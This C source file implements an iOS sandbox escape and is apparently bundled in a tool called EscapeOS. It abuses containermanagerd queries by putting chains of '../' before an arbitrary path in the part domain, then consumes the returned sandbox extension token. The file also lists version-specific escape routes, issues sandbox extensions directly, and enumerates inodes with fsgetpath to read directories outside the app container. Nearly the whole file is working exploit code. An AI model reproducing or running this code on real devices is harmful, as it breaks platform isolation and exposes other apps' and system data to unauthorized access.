/*
 * Adapted, unmodified-logic copy of forcequitOS/bad_query (bad_query.c),
 * commit as of 2026-08-11, for a disposable iPASide feasibility probe.
 * Only change from upstream: <xpc/xpc.h> is replaced with a local shim
 * (xpc_shim.h) because this cross-compile SDK does not ship that header;
 * the two symbols it declares (xpc_string_create/xpc_release) are resolved
 * from libSystem at link/runtime exactly as upstream relies on.
 *
 * Bundled in EscapeOS for on-device container access. Public redistribution
 * is blocked until upstream permission or a clean-room reimplementation exists
 * (see NOTICE).
 */

#include "bad_query.h"
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <errno.h>
#include <string.h>
#include <sys/stat.h>
#include "xpc_shim.h"

#include <sys/mount.h>
#include <sys/fsgetpath.h>

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

// Generalized bad_query: escape from any container class the process can
// query, using `levels` "../" to walk back to the filesystem root before
// appending the absolute `path`. The container class + identifier only decide
// which containermanagerd daemon handles the query and what base the
// traversal starts from; the actual target is always `path`.
int64_t bad_query_ex(char *path, bool create, uint64_t container_class,
                     char *identifier_str, bool is_group, int levels) {
    if (!path || path[0] != '/') return -255;
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) return -254;
    }

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    int64_t handle = -1;
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -1;
    }

    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -2;
    }

    query_set_class(query, container_class);
    xpc_object_t identifier = xpc_string_create(identifier_str);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);

    // Build "../" * levels + path. Extra levels are harmless — they just stay
    // at the root — so over-escaping is safe across different container depths.
    char prefix[512];
    int off = 0;
    if (levels < 1) levels = 1;
    if (levels > 160) levels = 160;
    for (int i = 0; i < levels; i++) {
        off += snprintf(prefix + off, sizeof(prefix) - (size_t)off, "../");
    }
    char *part = NULL;
    if (asprintf(&part, "%s%s", prefix, path) != -1) {
        query_set_part_domain(query, part);
    } else {
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -5;
    }

    if (is_group) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }

    void *result = query_get_single_result(query);
    if (!result) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -3;
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -4;
    }

    handle = consume_extension(token);
    free(token);
    free(part);
    xpc_release(identifier);
    query_free(query);

    dlclose(mgr);
    return handle;
}

int64_t bad_query(char *path, bool create, char *group_identifier, bool is_group) {
    if (group_identifier == NULL) {
        // Class 13 (systemgroup), MobileGestalt cache target. iOS 27 direct
        // route; iOS 26 this is blocked, caller should try the App Group or
        // InternalDaemon fallbacks.
        return bad_query_ex(path, create, 13, "systemgroup.com.apple.mobilegestaltcache", false, 9);
    } else {
        // Class 7 (App Group) sacrifice route, used on iOS 26.
        return bad_query_ex(path, create, 7, group_identifier, is_group, 10);
    }
}

int64_t bad_query_internal_daemon(char *path, bool create) {
    // Approach D: use a system daemon's class-10 container (InternalDaemon,
    // accessible on iOS 26 per bad_query's stated support matrix) as the
    // traversal base instead of an App Group. com.apple.lsd is a known
    // queryable daemon (also used for csstore-based app discovery). Generous
    // level count (16) guarantees we reach the filesystem root regardless of
    // the daemon container's depth. Experimental — only called as a last
    // resort when systemgroup and App Group routes both fail.
    return bad_query_ex(path, create, 10, "com.apple.lsd", false, 16);
}

void bad_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}

int64_t mg_consume_token(const char *token) {
    if (!token) return -2;
    sandbox_extension_consume_fn consume = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!consume) return -3;
    return consume(token);
}

// Issue a raw sandbox extension for `path` in THIS process and immediately
// consume it, so THIS process (not a parent/host) holds the grant. This is the
// supported sandbox pattern; the LiveContainer host-issued-token handoff has
// proven unreliable on iOS 26. Returns the handle (>= 0) on success, or a
// negative code:
//   -1 libsystem_sandbox.dylib could not be loaded
//   -2 sandbox_extension_issue_file symbol missing
//   -3 issue_file returned NULL for both read-write and read classes
//        (platform / entitlement policy denied the grant — expected on a
//         free-developer-signed app, which lacks the issuing entitlement)
//   -4 sandbox_extension_consume symbol missing
//   -5 path is NULL
int64_t mg_issue_and_consume(const char *path) {
    if (!path) return -5;
    void *sb = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_LAZY);
    if (!sb) sb = dlopen("libsystem_sandbox.dylib", RTLD_LAZY);
    if (!sb) return -1;
    typedef char *(*issue_fn)(const char *, const char *, uint32_t);
    typedef int64_t (*consume_fn)(const char *);
    issue_fn issue_file = (issue_fn)dlsym(sb, "sandbox_extension_issue_file");
    consume_fn consume = (consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!issue_file) { dlclose(sb); return -2; }
    if (!consume) { dlclose(sb); return -4; }
    char *token = issue_file("com.apple.app-sandbox.read-write", path, 0);
    if (!token) token = issue_file("com.apple.app-sandbox.read", path, 0);
    if (!token) { dlclose(sb); return -3; }
    int64_t handle = consume(token);
    free(token);
    dlclose(sb);
    return handle;
}

char *bad_query_list(char *path, int64_t max_inode) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) {
        // 对齐 Erosion 原版：目标路径 statfs 失败（如沙盒下部分 /var/containers
        // 子树不可直接 statfs）时，退回用 /private/var 或 /var 的 fsid 继续扫描，
        // 否则 fsgetpath 全部白跑、目录显示为空。
        if (statfs("/private/var", &sfs) != 0 && statfs("/var", &sfs) != 0) {
            return NULL;
        }
    }
    fsid_t fsid = sfs.f_fsid;

    size_t cap = 65536;
    size_t length = 0;
    size_t path_length = strlen(path);

    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';

    char buf[1200];
    for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;

        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;

        size_t need = strlen(p) + 2;
        if (length + need > cap) { cap *= 2; char *t = realloc(out, cap); if (!t) break; out = t; }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    return out;
}
